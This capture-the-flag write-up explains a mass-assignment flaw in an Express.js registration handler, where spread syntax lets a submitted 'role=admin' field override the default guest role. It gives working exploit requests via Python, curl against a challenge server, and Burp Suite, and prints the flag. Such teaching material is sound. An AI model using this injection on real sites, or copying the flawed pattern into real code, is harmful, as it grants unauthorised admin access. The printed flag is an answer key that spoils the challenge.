
# I wanna be the Admin

[日本語はこちら](./README-ja.md)

## Description

But you start from a guest!

## Writeup

### Overview

As you can see from the following code, the goal of this challenge is to log in as a user with the `admin` role.

```javascript
function auth(req, res, next) {
  const username = req.cookies.username;
  if (!username) return res.redirect("/login");

  const user = users.get(username);
  if (!user) return res.redirect("/login");

  req.user = user;
  next();
}
/* ... */
app.get("/", auth, (req, res) => {
  const { username, role, nickname } = req.user;

  res.send(`
    <h1>Hello ${username} (${nickname ?? "no nickname"})</h1>
    <p>role: ${role}</p>
    ${role === "admin" ? `<p><b>${FLAG}</b></p>` : ""}
    <a href="/logout">Logout</a>
  `);
});
```

However, any user you create via `POST /register` has the `guest` role.


```javascript
app.post("/register", (req, res) => {
  const user_data = req.body;
  if (
    !user_data ||
    !user_data.username ||
    !user_data.password ||
    !/^[a-z0-9]+$/.test(user_data.username) ||
    (user_data.nickname && !/^[a-z0-9]+$/.test(user_data.nickname))
  )
    return res.send("invalid input");

  if (users.has(user_data.username)) {
    return res.send("user already exists");
  }

  users.set(user_data.username, {
    role: "guest",
    ...user_data,
  });

  res.cookie("username", user_data.username);
  res.redirect("/");
});
```


### Where is the vulnerability?

The vulnerability lies here:

```javascript
users.set(user_data.username, {
  role: "guest",
  ...user_data,
});
```

The `...` part is called **spread syntax**; it copies all the properties from `user_data` into the new object. In JavaScript, properties listed later take precedence over earlier ones if there are duplicate properties. That means if `user_data` contains a `role` property equal to `admin`, that value will be used instead!

## How do you send the `role` property?

The `/register` page only contains fields for `username`, `password`, and `nickname`, so you can't send the `role` property using this form. 

```html
<form method="POST">
  <input name="username" placeholder="username" required />
  <br />
  <input name="password" type="password" placeholder="password" required />
  <br />
  <input name="nickname" placeholder="nickname" />
  <br />
  <button>Register</button>
</form>
```

This means you must use a different client that can send data. 

### Option 1: Using `requests` module in Python

In Python, you can use the `requests` module to send HTTP requests to the server and inspect its responses. The module automatically manages cookies and follows redirects just like a browser. To send data the way the browser form does, use the `post` method with the `data` argument:

```python
import requests

response = requests.post(f"http://localhost:3000/register", data={
    "username": "user",
    "password": "password",
    "role": "admin"
})
print(response.text)
```

### Option 2: Using `curl` command

Using the `curl` command may seem a bit more complicated than using Python. 

When a browser sends data to the server using a form, it uses the encoding called `application/x-www-form-urlencoded` by default. The data looks like this:

```
username=test&password=test
```

In Chrome, you can check this by:
1. Open the inspector
2. Open the "Network" tab and enable "Preserve log" (otherwise the log will be deleted when the page redirects to `/`)
3. Register the user
4. Select the `register` page
5. Go to the "Payload" tab and click "View source"

![alt text](image.png)

When you send data with `curl`, write it the same way.

In addition, you need the following flags in this challenge:
* `-L` - follow the redirect
* `-c <filename>` - save the cookie sent from server in file. 

The final command looks like this:

```bash
curl -L -c ./cookiejar http://34.170.146.252:64344/register -d "username=user&password=password&role=admin" 
```

### Option 3: Using Burp Suite

Burp Suite is a local proxy tool widely used in penetration testing. You can intercept a request sent from your browser, modify its parameters, and forward it to the server.

1. [Install](https://portswigger.net/burp/communitydownload) and open Burp Suite, then open temporary project.
2. Go to "Target" tab and press "Open browser".
3. In the browser, go to the challenge server and register a user.
4. In the "Target" panel, you will see the list of requests sent to the challenge server. Right click "POST /register" and click "Send to Repeater".
![alt text](image-1.png)
5. Go to the "Repeater" tab. You will see an HTTP request that was sent to the challenge server.
![alt text](image-2.png)
6. Click the gear button, enable "Process cookies in redirections", and set "Follow redirections" to "On-site only".
![alt text](image-3.png)
7. Change the body of the HTTP request to `username=user&password=password&role=admin`
8. Click the "Send" button. You will see the response that contains the flag!
![alt text](image-4.png)

## Flag

`Alpaca{This_is_badAss_mAss_Assignment}`
